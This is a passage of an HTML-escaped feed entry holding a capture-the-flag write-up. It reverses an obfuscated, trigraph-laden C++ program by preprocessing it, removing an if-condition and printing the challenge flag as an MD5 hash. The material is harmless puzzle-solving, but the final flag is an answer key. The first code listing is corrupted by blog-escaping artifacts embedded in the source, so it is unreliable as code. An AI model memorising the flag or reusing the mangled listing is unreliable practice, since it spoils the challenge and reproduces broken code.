style=&quot;color:#d08770;&quot;&gt;0x43&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;87&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;123&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;110&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x40&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x67&lt;&#x2F;span&gt;&lt;span&gt;};
+&lt;&#x2F;span&gt;&lt;span&gt;bbbb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;fff&lt;&#x2F;span&gt;&lt;span&gt;() {
+&lt;&#x2F;span&gt;&lt;span&gt;  l10l ll01 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;l101&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00f1b00&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x08ff08&lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;354&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;  bbbb aaa = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mlm&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%f%l%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;lld&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;, ffffff);
+&lt;&#x2F;span&gt;&lt;span&gt;  f++;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(ll01&amp;lt;(ll01&amp;amp;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1&lt;&#x2F;span&gt;&lt;span&gt;))??&amp;lt;ff ggg=&amp;quot;&amp;quot;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;zz &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;ff&lt;&#x2F;span&gt;&lt;span&gt;(){
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(bbbb guu=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;guu&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt; data-blogger-escaped-guu=&amp;quot;&amp;quot;&amp;gt;(guu&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span&gt;));++guu&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt; {
+&lt;&#x2F;span&gt;&lt;span&gt;    ccc[nv-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] = ((ccc[guu-(((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;*(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xd5f650&lt;&#x2F;span&gt;&lt;span&gt;))+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)] ^ (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x31&lt;&#x2F;span&gt;&lt;span&gt;-guu)));
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;zz &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;ggg&lt;&#x2F;span&gt;&lt;span&gt;()??&amp;lt;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(l10l cc=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;cc&amp;lt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x11&lt;&#x2F;span&gt;&lt;span&gt;;++cc)??&amp;lt;mlm c=&amp;quot;&amp;quot; cc=&amp;quot;&amp;quot; ccc=&amp;quot;&amp;quot; x=&amp;quot;&amp;quot;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;%&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; oops subtracted by 1 not keeping my base is mind&amp;lt;&#x2F;mlm&amp;gt;&amp;lt;!--18--&amp;gt;&amp;lt;&#x2F;ff&amp;gt;&amp;lt;&#x2F;cstdlib&amp;gt;&amp;lt;&#x2F;cstdio&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;```		
+&lt;&#x2F;span&gt;&lt;span&gt;And we also got a hint: Hint: Preprocess -&amp;gt; Compile -&amp;gt; Execute   
+&lt;&#x2F;span&gt;&lt;span&gt;So we, basicly, did what they said. Firstly, we have preproceded file without a compilation. And then compiled, and executed the new preprocessed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span&gt;(new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cpp&lt;&#x2F;span&gt;&lt;span&gt;).   
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;``` bash
+&lt;&#x2F;span&gt;&lt;span&gt;wiremage@oxyz ~&#x2F;c&#x2F;b&#x2F;bin200&amp;gt; g++ -trigraphs -E obfuscated.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cpp &lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cpp
+&lt;&#x2F;span&gt;&lt;span&gt;wiremage@oxyz ~&#x2F;c&#x2F;b&#x2F;bin200&amp;gt; g++ new.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cpp 
+&lt;&#x2F;span&gt;&lt;span&gt;wiremage@oxyz ~&#x2F;c&#x2F;b&#x2F;bin200&amp;gt; .&#x2F;a.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;out 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8243101811275816809
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;That gave us a nice number, lol.&lt;&#x2F;p&gt;
+&lt;p&gt;Next, we took a peek inside the &lt;code&gt;new.cpp&lt;&#x2F;code&gt; source and found an unnecessary &lt;code&gt;if&lt;&#x2F;code&gt; statement, so we removed it.&lt;br &#x2F;&gt;
+We discovered that the number we got on the first run came from:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%f%l%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;lld&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;, f);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;However, if you look at the next two lines, you&#x27;ll see calls to functions that also perform some &lt;code&gt;printf&lt;&#x2F;code&gt; operations.
+So, we decided to force their execution by removing the &lt;code&gt;if&lt;&#x2F;code&gt; condition.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;() {
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; ll01 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;()%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x00f1b00&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x08ff08&lt;&#x2F;span&gt;&lt;span&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;354&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; aaa = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%f%l%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;lld&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;, f);
+&lt;&#x2F;span&gt;&lt;span&gt;  f++;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(ll01&amp;lt;(ll01&amp;amp;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x1&lt;&#x2F;span&gt;&lt;span&gt;)){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ff&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ggg&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F;THIS IF HERE WE REMOVED LOL Remember remove only if part, so ff();ggg(); got executed!
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ff&lt;&#x2F;span&gt;&lt;span&gt;(){
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; guu=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;guu&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;&amp;amp;&amp;amp;(guu&amp;gt;(guu&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span&gt;));++guu) {
+&lt;&#x2F;span&gt;&lt;span&gt;    ccc[guu-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] = ((ccc[guu-(((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;*(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xd5f650&lt;&#x2F;span&gt;&lt;span&gt;))+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)] ^ (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x31&lt;&#x2F;span&gt;&lt;span&gt;-guu)));
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ggg&lt;&#x2F;span&gt;&lt;span&gt;(){
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; cc=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;cc&amp;lt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x11&lt;&#x2F;span&gt;&lt;span&gt;;++cc){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%x%c&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;, ccc&amp;lt;:cc]);
+&lt;&#x2F;span&gt;&lt;span&gt;%&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After that -&amp;gt; compiled file again -&amp;gt; executed -&amp;gt; got the flag.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wiremage@oxyz ~&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;c&#x2F;b&#x2F;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; g++ new.cpp 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wiremage@oxyz ~&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;c&#x2F;b&#x2F;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; .&#x2F;a.out 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;8243101811275816809
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;just_another_FLaG
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Encode just_another_FLaG with MD5 and thats it, you own the flag.&lt;&#x2F;p&gt;
+&lt;p&gt;The flag: &lt;strong&gt;a38834db6eb9d31e3c7e878bae3da748&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
